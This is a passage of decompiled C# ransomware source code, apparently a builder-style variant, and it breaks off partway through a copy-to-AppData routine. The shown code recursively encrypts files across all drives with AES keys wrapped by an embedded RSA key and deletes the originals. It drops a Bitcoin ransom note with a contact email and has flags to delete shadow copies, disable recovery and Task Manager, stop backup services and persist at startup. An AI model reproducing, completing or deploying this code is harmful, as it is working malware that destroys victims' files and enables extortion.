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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail : ag1613162@gmail.com ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: ag1613162@gmail.com )", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>w2ISh0dXma0UXPO1sfG8EU/uB7EqusVLh7UsXH0B671XwiFagWGgVOInbmuVjc9EXrnkYyQdm9lq2z1YJIS3Bd2Klpi72L9pwnvan3YxIEQzJXd1dfTYagNr/oSwtkvS0hBGF1CezhrpMOom83F9+zvQzX9c4dFAnvN17x27Bj8aSsMk5pYglkqvTvC0IGKE8dTsDtFjCD74HL0UQPe+bLU2+7C7ZOtkEKhMaamLs9WOq5HbwieJz1TfWYLJjtd8x79BokwR9tm9V8OKo4bZv5iOiZ344DV4V2ajW1T02PFtjRuInv7RmqKMfMhAklocn7P0xBBtDvVeEg97DnUZMQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
